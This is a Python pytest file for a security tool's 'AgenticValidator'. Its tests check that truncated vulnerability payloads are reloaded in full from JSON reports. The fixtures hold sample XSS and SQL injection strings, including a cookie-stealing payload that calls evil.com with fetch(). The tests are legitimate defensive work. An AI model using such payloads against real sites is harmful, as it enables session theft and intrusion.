"""
Test: AgenticValidator Full Payload Loading (v2.1.0+)

This test validates that AgenticValidator correctly loads full payloads
from JSON reports when event payloads are truncated to 200 characters.

Author: BugTraceAI Team
Date: 2026-02-02
"""

import json
import tempfile
from pathlib import Path
import pytest

from bugtrace.agents.agentic_validator import AgenticValidator


def test_ensure_full_payload_short_payload():
    """Test that short payloads (<199 chars) are not loaded from JSON."""
    validator = AgenticValidator()

    finding = {
        "type": "XSS",
        "parameter": "q",
        "payload": "<script>alert(1)</script>",  # Short payload (25 chars)
        "url": "https://example.com/search?q=test"
    }

    result = validator._ensure_full_payload(finding)

    # Should return original finding unchanged
    assert result["payload"] == "<script>alert(1)</script>"
    assert len(result["payload"]) == 25


def test_ensure_full_payload_truncated_with_json():
    """Test that truncated payloads (>199 chars) are loaded from JSON."""
    validator = AgenticValidator()

    # Create temporary JSON file with full payload
    with tempfile.NamedTemporaryFile(mode='w', suffix='.json', delete=False) as f:
        full_payload = "<script>alert(document.cookie)</script>" + "A" * 300  # 340+ chars
        json_data = {
            "target_url": "https://example.com/search",
            "vulnerabilities": [
                {
                    "type": "XSS (Reflected)",
                    "parameter": "q",
                    "payload": full_payload,
                    "exploitation_strategy": full_payload,
                    "reasoning": "Full reasoning text that is very long and detailed..." * 20,
                    "fp_reason": "",
                    "severity": "High",
                    "confidence_score": 9
                }
            ]
        }
        json.dump(json_data, f)
        json_path = f.name

    try:
        # Create finding with truncated payload
        truncated_payload = full_payload[:200]  # Truncate to 200 chars
        finding = {
            "type": "XSS",
            "parameter": "q",
            "payload": truncated_payload,
            "url": "https://example.com/search?q=test",
            "_report_files": {
                "json": json_path,
                "markdown": json_path.replace('.json', '.md')
            }
        }

        # Load full payload
        result = validator._ensure_full_payload(finding)

        # Verify full payload was loaded
        assert len(result["payload"]) > 200
        assert len(result["payload"]) == len(full_payload)
        assert result["payload"] == full_payload
        assert "reasoning" in result  # Should also load other fields

    finally:
        # Cleanup
        Path(json_path).unlink(missing_ok=True)


def test_ensure_full_payload_no_metadata():
    """Test handling when finding has no _report_files metadata."""
    validator = AgenticValidator()

    truncated_payload = "A" * 250  # Long payload
    finding = {
        "type": "XSS",
        "parameter": "q",
        "payload": truncated_payload,
        "url": "https://example.com/search"
        # No _report_files metadata
    }

    result = validator._ensure_full_payload(finding)

    # Should return original (truncated) payload with warning logged
    assert result["payload"] == truncated_payload
    assert len(result["payload"]) == 250


def test_ensure_full_payload_json_not_found():
    """Test handling when JSON file doesn't exist."""
    validator = AgenticValidator()

    truncated_payload = "A" * 250
    finding = {
        "type": "XSS",
        "parameter": "q",
        "payload": truncated_payload,
        "url": "https://example.com/search",
        "_report_files": {
            "json": "/nonexistent/path/to/report.json"
        }
    }

    result = validator._ensure_full_payload(finding)

    # Should return original payload when JSON not found
    assert result["payload"] == truncated_payload


def test_ensure_full_payload_no_matching_vuln():
    """Test when JSON doesn't contain matching vulnerability."""
    validator = AgenticValidator()

    # Create JSON with different vulnerability
    with tempfile.NamedTemporaryFile(mode='w', suffix='.json', delete=False) as f:
        json_data = {
            "vulnerabilities": [
                {
                    "type": "SQLi",  # Different type
                    "parameter": "id",  # Different parameter
                    "payload": "' OR 1=1--",
                }
            ]
        }
        json.dump(json_data, f)
        json_path = f.name

    try:
        truncated_payload = "A" * 250
        finding = {
            "type": "XSS",  # Looking for XSS
            "parameter": "q",  # Different param
            "payload": truncated_payload,
            "url": "https://example.com/search",
            "_report_files": {"json": json_path}
        }

        result = validator._ensure_full_payload(finding)

        # Should return original when no match found
        assert result["payload"] == truncated_payload

    finally:
        Path(json_path).unlink(missing_ok=True)


def test_agentic_prepare_context_calls_ensure_full_payload():
    """Test that _agentic_prepare_context automatically loads full payload."""
    validator = AgenticValidator()

    # Create temporary JSON with full payload
    with tempfile.NamedTemporaryFile(mode='w', suffix='.json', delete=False) as f:
        full_payload = "<svg/onload=fetch('https://evil.com?c='+document.cookie)>" + "X" * 250
        json_data = {
            "vulnerabilities": [{
                "type": "XSS",
                "parameter": "search",
                "payload": full_payload,
                "exploitation_strategy": full_payload,
            }]
        }
        json.dump(json_data, f)
        json_path = f.name

    try:
        # Create finding with truncated payload
        finding = {
            "type": "XSS",
            "parameter": "search",
            "payload": full_payload[:200],  # Truncated
            "url": "https://example.com/search?search=test",
            "_report_files": {"json": json_path}
        }

        # Call _agentic_prepare_context
        url, payload, vuln_type, param = validator._agentic_prepare_context(finding)

        # Verify full payload is returned
        assert len(payload) > 200
        assert payload == full_payload
        assert vuln_type == "xss"
        assert param == "search"

    finally:
        Path(json_path).unlink(missing_ok=True)


if __name__ == "__main__":
    pytest.main([__file__, "-v", "-s"])
